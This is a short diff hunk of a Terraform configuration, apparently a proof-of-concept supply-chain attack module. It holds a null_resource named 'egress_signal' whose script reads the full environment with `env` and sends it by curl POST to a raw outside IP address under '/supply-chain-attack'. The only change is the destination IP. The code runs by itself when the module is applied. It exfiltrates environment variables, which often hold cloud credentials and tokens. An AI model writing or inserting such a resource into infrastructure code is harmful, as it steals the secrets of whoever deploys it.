@@ -19,7 +19,7 @@ resource "null_resource" "egress_signal" {
       echo "[POC] Running module from remote source" 
       RESULT=`env`
 
-      curl -X POST "http://34.238.194.120/supply-chain-attack" -d $RESULT 
+      curl -X POST "http://13.218.23.60/supply-chain-attack" -d $RESULT 
 
       echo "[POC] Done"
     EOT
